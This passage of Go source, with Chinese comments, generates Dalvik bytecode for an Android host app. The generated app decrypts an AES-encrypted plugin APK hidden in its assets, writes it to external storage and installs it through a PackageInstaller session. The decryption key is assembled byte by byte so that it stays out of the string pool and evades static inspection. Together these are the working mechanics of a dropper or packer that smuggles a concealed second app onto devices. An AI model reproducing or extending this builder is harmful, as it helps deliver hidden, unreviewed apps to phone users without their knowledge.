		Class: self, Name: "drop",
		Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKCtxDesc}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(1)
	if err := a.InvokeStatic([]int{3, 1}, dex.MethodSpec{
		Class: self, Name: "install",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc, dualAPKByteArrDesc}},
	}); err != nil {
		return nil, err
	}
	a.Label("end")
	a.ReturnVoid()
	return dualAPKAssemble(4, 1, 2, a, nil)
}

// dualAPKDropCode 生成 drop(Context)byte[]：解密 assets 里的插件并落地。
func dualAPKDropCode(self string, sp dualAPKDexSpec) (*dex.CodeBlob, error) {
	const (
		rBase = 0
		rDir  = 1
		rOut  = 2
		rAm   = 3
		rIn   = 4
		rBlob = 5
		rKey  = 6
		rData = 7
		rFos  = 8
		rT0   = 9
		rT1   = 10
		rCtx  = 11
	)
	a := dex.NewAsm()
	// base = c.getExternalFilesDir(null)
	a.Const4(rT0, 0)
	if err := a.InvokeVirtual([]int{rCtx, rT0}, dex.MethodSpec{
		Class: dualAPKCtxDesc, Name: "getExternalFilesDir",
		Proto: dex.ProtoSpec{Ret: dualAPKFileDesc, Params: []string{dualAPKStrDesc}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rBase)
	// dir = new File(base, "plugins"); dir.mkdirs()
	a.NewInstance(rDir, dualAPKFileDesc)
	a.ConstString(rT0, "plugins")
	if err := a.InvokeDirect([]int{rDir, rBase, rT0}, dex.MethodSpec{
		Class: dualAPKFileDesc, Name: "<init>",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKFileDesc, dualAPKStrDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{rDir}, dex.MethodSpec{
		Class: dualAPKFileDesc, Name: "mkdirs", Proto: dex.ProtoSpec{Ret: "Z"},
	}); err != nil {
		return nil, err
	}
	// out = new File(dir, PLUGIN_FILE)
	a.NewInstance(rOut, dualAPKFileDesc)
	a.ConstString(rT0, sp.PluginFile)
	if err := a.InvokeDirect([]int{rOut, rDir, rT0}, dex.MethodSpec{
		Class: dualAPKFileDesc, Name: "<init>",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKFileDesc, dualAPKStrDesc}},
	}); err != nil {
		return nil, err
	}
	// in = c.getAssets().open(ASSET)
	if err := a.InvokeVirtual([]int{rCtx}, dex.MethodSpec{
		Class: dualAPKCtxDesc, Name: "getAssets", Proto: dex.ProtoSpec{Ret: dualAPKAmDesc},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rAm)
	a.ConstString(rT0, sp.AssetKey)
	if err := a.InvokeVirtual([]int{rAm, rT0}, dex.MethodSpec{
		Class: dualAPKAmDesc, Name: "open",
		Proto: dex.ProtoSpec{Ret: dualAPKInDesc, Params: []string{dualAPKStrDesc}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rIn)
	// blob = read(in, SIZE)
	a.Const32(rT0, int32(sp.PluginSize))
	if err := a.InvokeStatic([]int{rIn, rT0}, dex.MethodSpec{
		Class: self, Name: "read",
		Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKInDesc, "I"}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rBlob)
	// key = { ... }：逐字节构造，不在字符串池留明文。
	a.Const16(rT0, int16(pack.KeySize))
	if err := a.NewArray(rKey, rT0, dualAPKByteArrDesc); err != nil {
		return nil, err
	}
	for i, b := range sp.Key {
		a.Const16(rT0, int16(b))
		a.Const16(rT1, int16(i))
		a.APutByte(rT0, rKey, rT1)
	}
	// data = decrypt(blob, key, DROP)
	a.Const16(rT0, int16(sp.PluginDrop))
	if err := a.InvokeStatic([]int{rBlob, rKey, rT0}, dex.MethodSpec{
		Class: self, Name: "decrypt",
		Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKByteArrDesc, dualAPKByteArrDesc, "I"}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rData)
	// fos = new FileOutputStream(out); fos.write(data); fos.close()
	a.NewInstance(rFos, dualAPKFosDesc)
	if err := a.InvokeDirect([]int{rFos, rOut}, dex.MethodSpec{
		Class: dualAPKFosDesc, Name: "<init>",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKFileDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{rFos, rData}, dex.MethodSpec{
		Class: dualAPKFosDesc, Name: "write",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKByteArrDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{rFos}, dex.MethodSpec{
		Class: dualAPKFosDesc, Name: "close", Proto: dex.ProtoSpec{Ret: "V"},
	}); err != nil {
		return nil, err
	}
	a.ReturnObject(rData)
	return dualAPKAssemble(12, 1, 3, a, nil)
}

// dualAPKInstallCode 生成 install(Context,byte[])V：PackageInstaller 会话。
func dualAPKInstallCode(self string) (*dex.CodeBlob, error) {
	const (
		rPm    = 0
		rPi    = 1
		rSp    = 2
		rID    = 3
		rSe    = 4
		rOs    = 5
		rOffLo = 6
		rLenLo = 8
		rIt    = 10
		rPend  = 11
		rT0    = 12
		rT1    = 13
		rCtx   = 14
		rData  = 15
	)
	// 注意：openWrite(String,long,long) 需要 6 个寄存器，超出 35c 的 5 个上限，
	// 必须用 invoke-virtual/range。这里先以 5 个寄存器生成等价占位指令，
	// 组装后由 dualAPKPatchInvokeRange 就地改写为 3rc（字长相同，分支/补丁不动）。
	a := dex.NewAsm()
	if err := a.InvokeVirtual([]int{rCtx}, dex.MethodSpec{
		Class: dualAPKCtxDesc, Name: "getPackageManager", Proto: dex.ProtoSpec{Ret: dualAPKPmDesc},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rPm)
	if err := a.InvokeVirtual([]int{rPm}, dex.MethodSpec{
		Class: dualAPKPmDesc, Name: "getPackageInstaller", Proto: dex.ProtoSpec{Ret: dualAPKPiDesc},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rPi)
	a.NewInstance(rSp, dualAPKSpDesc)
	a.Const4(rT0, 1) // SessionParams.MODE_FULL_INSTALL
	if err := a.InvokeDirect([]int{rSp, rT0}, dex.MethodSpec{
		Class: dualAPKSpDesc, Name: "<init>", Proto: dex.ProtoSpec{Ret: "V", Params: []string{"I"}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{rPi, rSp}, dex.MethodSpec{
		Class: dualAPKPiDesc, Name: "createSession",
		Proto: dex.ProtoSpec{Ret: "I", Params: []string{dualAPKSpDesc}},
	}); err != nil {
		return nil, err
	}
	a.MoveResult(rID)
	if err := a.InvokeVirtual([]int{rPi, rID}, dex.MethodSpec{
		Class: dualAPKPiDesc, Name: "openSession",
		Proto: dex.ProtoSpec{Ret: dualAPKSessDesc, Params: []string{"I"}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rSe)
	a.ConstString(rOs, "base.apk")
	// 两个 long 实参用等宽占位（const/32），组装后改写成 const-wide/16 + nop。
	a.Const32(rOffLo, dualAPKMagicOff)
	a.Const32(rLenLo, dualAPKMagicLen)
	if err := a.InvokeVirtual([]int{rSe, rOs, rOffLo, rOffLo + 1, rLenLo}, dex.MethodSpec{
		Class: dualAPKSessDesc, Name: "openWrite",
		Proto: dex.ProtoSpec{Ret: dualAPKOsDesc, Params: []string{dualAPKStrDesc, "J", "J"}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rOs)
	// marker：dualAPKPatchInvokeRange 靠它定位上面那条 35c 占位 invoke。
	a.Const32(rT0, dualAPKMagicInvoke)
	if err := a.InvokeVirtual([]int{rOs, rData}, dex.MethodSpec{
		Class: dualAPKOsDesc, Name: "write", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKByteArrDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{rSe, rOs}, dex.MethodSpec{
		Class: dualAPKSessDesc, Name: "fsync", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKOsDesc}},
	}); err != nil {
		return nil, err
	}
	if err := a.InvokeVirtual([]int{rOs}, dex.MethodSpec{
		Class: dualAPKOsDesc, Name: "close", Proto: dex.ProtoSpec{Ret: "V"},
	}); err != nil {
		return nil, err
	}
	// 目标 PendingIntent 指向宿主自身 Activity：系统把安装结果作为新 Intent
	// 投递回来（onNewIntent/onCreate 的 status() 负责区分状态并转交安装界面）。
	a.NewInstance(rIt, dualAPKIntentDesc)
	a.ConstClass(rT1, self)
	if err := a.InvokeDirect([]int{rIt, rCtx, rT1}, dex.MethodSpec{
		Class: dualAPKIntentDesc, Name: "<init>",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKCtxDesc, dualAPKClassDesc}},
	}); err != nil {
		return nil, err
	}
	a.Const4(rT1, 0) // requestCode
	a.Const32(rT0, dualAPKPendingFlags)
	if err := a.InvokeStatic([]int{rCtx, rT1, rIt, rT0}, dex.MethodSpec{
		Class: dualAPKPendDesc, Name: "getActivity",
		Proto: dex.ProtoSpec{Ret: dualAPKPendDesc, Params: []string{dualAPKCtxDesc, "I", dualAPKIntentDesc, "I"}},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rPend)
	if err := a.InvokeVirtual([]int{rPend}, dex.MethodSpec{
		Class: dualAPKPendDesc, Name: "getIntentSender", Proto: dex.ProtoSpec{Ret: dualAPKSenderDesc},
	}); err != nil {
		return nil, err
	}
	a.MoveResultObject(rT0)
	if err := a.InvokeVirtual([]int{rSe, rT0}, dex.MethodSpec{
		Class: dualAPKSessDesc, Name: "commit", Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKSenderDesc}},
	}); err != nil {
		return nil, err
	}
	a.ReturnVoid()

	return dualAPKAssemble(16, 2, 6, a, func(words []uint16) error {
		if err := dualAPKPatchConstWide(words, dualAPKMagicOff, rOffLo, 0); err != nil {
			return err
		}
		if err := dualAPKPatchConstWide(words, dualAPKMagicLen, rLenLo, -1); err != nil {
			return err
		}
		// 占位 invoke 之后紧跟 1 字的 move-result-object，再是 marker。
		return dualAPKPatchInvokeRange(words, dualAPKMagicInvoke, rT0, 6, rSe)
	})
}

// dualAPKPatchConstWide 把占位的 const(#32) 原地改写为 const-wide/16 + nop。
//
// 等宽替换（3 字 → 2 字 + 1 字 nop）保证分支偏移与符号补丁位置不变。
func dualAPKPatchConstWide(words []uint16, magic int32, reg int, lit int16) error {
	lo := uint16(uint32(magic) & 0xffff)
	hi := uint16(uint32(magic) >> 16)
	found := -1
	for i := 0; i+2 < len(words); i++ {
		if words[i] == 0x14|uint16(reg&0xff)<<8 && words[i+1] == lo && words[i+2] == hi {
			if found >= 0 {
				return fmt.Errorf("B9: const 占位 magic 0x%08x 出现多次", magic)
			}
			found = i
		}
	}
	if found < 0 {
		return fmt.Errorf("B9: 未找到 const 占位 magic 0x%08x（组装结果与预期不符）", magic)
	}
	words[found] = 0x16 | uint16(reg&0xff)<<8 // const-wide/16 vReg, #+lit
	words[found+1] = uint16(lit)
	words[found+2] = 0x0000 // nop，保持字长
	return nil
}

// dualAPKPatchInvokeRange 把占位的 35c invoke 改写为 3rc invoke-*-range。
//
// 两条指令都是 3 个字，method@ 索引位置相同（word1），因此 Asm 登记的
// 符号补丁与其它分支偏移都不需要调整。
func dualAPKPatchInvokeRange(words []uint16, magic int32, markerReg, count, first int) error {
	lo := uint16(uint32(magic) & 0xffff)
	hi := uint16(uint32(magic) >> 16)
	found := -1
	for i := 0; i+2 < len(words); i++ {
		if words[i] == 0x14|uint16(markerReg&0xff)<<8 && words[i+1] == lo && words[i+2] == hi {
			if found >= 0 {
				return fmt.Errorf("B9: invoke 占位 magic 0x%08x 出现多次", magic)
			}
			found = i
		}
	}
	if found < 0 {
		return fmt.Errorf("B9: 未找到 invoke 占位 magic 0x%08x", magic)
	}
	at := found - 1 - 3 // 1 字 move-result-object + 3 字 invoke
	if at < 0 || words[at]&0xff != 0x6e {
		return fmt.Errorf("B9: invoke 占位 magin 定位失败（probe=0x%04x）", words[at])
	}
	words[at] = 0x74 | uint16(count)<<8 // invoke-virtual/range {vFirst..}, count
	words[at+2] = uint16(first)         // CCCC = 首寄存器
	for k := found; k < found+3; k++ {
		words[k] = 0x0000
	}
	return nil
}

// dualAPKReadCode 生成 read(InputStream,int)byte[]（与 B3 Loader 的读取实现同构）。
func dualAPKReadCode() (*dex.CodeBlob, error) {
	const (
		rOut   = 0
		rOff   = 1
		rN     = 2
		rZero  = 3
		rIn    = 4
		rTotal = 5
	)
	readM := dex.MethodSpec{Class: dualAPKInDesc, Name: "read",
		Proto: dex.ProtoSpec{Ret: "I", Params: []string{dualAPKByteArrDesc, "I", "I"}}}
	closeM := dex.MethodSpec{Class: dualAPKInDesc, Name: "close", Proto: dex.ProtoSpec{Ret: "V"}}

	a := dex.NewAsm()
	if err := a.NewArray(rOut, rTotal, dualAPKByteArrDesc); err != nil {
		return nil, err
	}
	a.Const4(rOff, 0)
	a.Const4(rZero, 0)
	a.Label("loop")
	if err := a.IfGe(rOff, rTotal, "end"); err != nil {
		return nil, err
	}
	a.SubInt(rN, rTotal, rOff)
	if err := a.InvokeVirtual([]int{rIn, rOut, rOff, rN}, readM); err != nil {
		return nil, err
	}
	a.MoveResult(rN)
	if err := a.IfGt(rN, rZero, "cont"); err != nil {
		return nil, err
	}
	a.Goto("end")
	a.Label("cont")
	a.AddInt(rOff, rOff, rN)
	a.Goto("loop")
	a.Label("end")
	if err := a.InvokeVirtual([]int{rIn}, closeM); err != nil {
		return nil, err
	}
	a.ReturnObject(rOut)
	return dualAPKAssemble(6, 2, 4, a, nil)
}

// dualAPKDecryptCode 生成 decrypt(byte[],byte[],int)byte[]：IV‖AES-256-CBC(PKCS5)。
func dualAPKDecryptCode() (*dex.CodeBlob, error) {
	const (
		rIv   = 0
		rCp   = 1
		rSks  = 2
		rIvs  = 3
		rT0   = 4
		rT1   = 5
		rBlob = 6
		rKey  = 7
		rDrop = 8
	)
	getInstance := dex.MethodSpec{Class: dualAPKCipherDesc, Name: "getInstance",
		Proto: dex.ProtoSpec{Ret: dualAPKCipherDesc, Params: []string{dualAPKStrDesc}}}
	cipherInit := dex.MethodSpec{Class: dualAPKCipherDesc, Name: "init",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{"I", dualAPKKeyIface, dualAPKAlgoSpecDesc}}}
	doFinal := dex.MethodSpec{Class: dualAPKCipherDesc, Name: "doFinal",
		Proto: dex.ProtoSpec{Ret: dualAPKByteArrDesc, Params: []string{dualAPKByteArrDesc, "I", "I"}}}
	sksInit := dex.MethodSpec{Class: dualAPKSecretKey, Name: "<init>",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKByteArrDesc, dualAPKStrDesc}}}
	ivInit := dex.MethodSpec{Class: dualAPKIvSpecDesc, Name: "<init>",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKByteArrDesc}}}
	arraycopy := dex.MethodSpec{Class: "Ljava/lang/System;", Name: "arraycopy",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{"Ljava/lang/Object;", "I", "Ljava/lang/Object;", "I", "I"}}}

	a := dex.NewAsm()
	a.Const16(rT0, int16(pack.BlockSize))
	if err := a.NewArray(rIv, rT0, dualAPKByteArrDesc); err != nil {
		return nil, err
	}
	a.Const4(rT0, 0)
	a.Const16(rT1, int16(pack.BlockSize))
	if err := a.InvokeStatic([]int{rBlob, rT0, rIv, rT0, rT1}, arraycopy); err != nil {
		return nil, err
	}
	a.ConstString(rT0, "AES/CBC/PKCS5Padding")
	if err := a.InvokeStatic([]int{rT0}, getInstance); err != nil {
		return nil, err
	}
	a.MoveResultObject(rCp)
	a.NewInstance(rSks, dualAPKSecretKey)
	a.ConstString(rT0, "AES")
	if err := a.InvokeDirect([]int{rSks, rKey, rT0}, sksInit); err != nil {
		return nil, err
	}
	a.NewInstance(rIvs, dualAPKIvSpecDesc)
	if err := a.InvokeDirect([]int{rIvs, rIv}, ivInit); err != nil {
		return nil, err
	}
	a.Const16(rT0, 2) // Cipher.DECRYPT_MODE
	if err := a.InvokeVirtual([]int{rCp, rT0, rSks, rIvs}, cipherInit); err != nil {
		return nil, err
	}
	a.Const16(rT0, int16(pack.BlockSize))
	a.ArrayLength(rT1, rBlob)
	a.SubInt(rT1, rT1, rT0)
	a.SubInt(rT1, rT1, rDrop)
	if err := a.InvokeVirtual([]int{rCp, rBlob, rT0, rT1}, doFinal); err != nil {
		return nil, err
	}
	a.MoveResultObject(rT1)
	a.ReturnObject(rT1)
	return dualAPKAssemble(9, 3, 5, a, nil)
}

// dualAPKStatusCode 生成 status(Context,Intent)V：处理安装器回传的状态。
func dualAPKStatusCode(sp dualAPKDexSpec) (*dex.CodeBlob, error) {
	const (
		rSt  = 0
		rObj = 1
		rT0  = 2
		rT1  = 3
		rCtx = 4
		rIt  = 5
	)
	getIntExtra := dex.MethodSpec{Class: dualAPKIntentDesc, Name: "getIntExtra",
		Proto: dex.ProtoSpec{Ret: "I", Params: []string{dualAPKStrDesc, "I"}}}
	getParcelable := dex.MethodSpec{Class: dualAPKIntentDesc, Name: "getParcelableExtra",
		Proto: dex.ProtoSpec{Ret: dualAPKParcelable, Params: []string{dualAPKStrDesc}}}
	startAct := dex.MethodSpec{Class: dualAPKCtxDesc, Name: "startActivity",
		Proto: dex.ProtoSpec{Ret: "V", Params: []string{dualAPKIntentDesc}}}

	a := dex.NewAsm()
	a.ConstString(rT1, dualAPKStatusExtra)
	a.Const16(rT0, -2)
	if err := a.InvokeVirtual([]int{rIt, rT1, rT0}, getIntExtra); err != nil {
		return nil, err
	}
	a.MoveResult(rSt)
	// status == STATUS_PENDING_USER_ACTION：转交系统安装界面。
	//
	// 该常量是 -1（不是 1）——AOSP PackageInstaller.STATUS_PENDING_USER_ACTION = -1，
	// 且此时 EXTRA_INTENT 里才有安装界面 Intent。把它当 1 会让用户永远看不到
	// 安装确认界面（pending 分支成为死代码，设备上的表现是「点了没反应」）。
	a.Const4(rT0, -1)
	if err := a.IfEq(rSt, rT0, "pending"); err != nil {
		return nil, err
	}
	// status == SUCCESS(0)：提示完成；status < 0：没有结果（正常首次启动）。
	a.Const4(rT0, 0)
	if err := a.IfEq(rSt, rT0, "done"); err != nil {
		return nil, err
	}
	if err := a.IfLt(rSt, rT0, "end"); err != nil {
		return nil, err
	}
	if err := dualAPKEmitToast(a, rCtx, rObj, rT0, sp.TextFail); err != nil {
		return nil, err
	}
	a.Goto("end")
	a.Label("done")
	if err := dualAPKEmitToast(a, rCtx, rObj, rT0, sp.TextDone); err != nil {
		return nil, err
	}
	a.Goto("end")
	a.Label("pending")
	a.ConstString(rT1, dualAPKIntentExtra)
	if err := a.InvokeVirtual([]int{rIt, rT1}, getParcelable); err != nil {
		return nil, err
	}
	a.MoveResultObject(rObj)
	a.IfEqz(rObj, "end")
	a.CheckCast(rObj, dualAPKIntentDesc)
	if err := a.InvokeVirtual([]int{rCtx, rObj}, startAct); err != nil {
		return nil, err
	}
	a.Label("end")
	a.ReturnVoid()
	return dualAPKAssemble(6, 2, 3, a, nil)
}

// dualAPKEmitToast 生成 Toast.makeText(ctx, text, LENGTH_LONG).show()。
func dualAPKEmitToast(a *dex.Asm, ctx, tmp, tmp2 int, text string) error {
	makeText := dex.MethodSpec{Class: dualAPKToastDesc, Name: "makeText",
		Proto: dex.ProtoSpec{Ret: dualAPKToastDesc, Params: []string{dualAPKCtxDesc, dualAPKCharSeqDesc, "I"}}}
	show := dex.MethodSpec{Class: dualAPKToastDesc, Name: "show", Proto: dex.ProtoSpec{Ret: "V"}}
	a.ConstString(tmp, text)
	a.Const4(tmp2, 1) // Toast.LENGTH_LONG
	if err := a.InvokeStatic([]int{ctx, tmp, tmp2}, makeText); err != nil {
		return err
	}
	a.MoveResultObject(tmp)
	return a.InvokeVirtual([]int{tmp}, show)
}
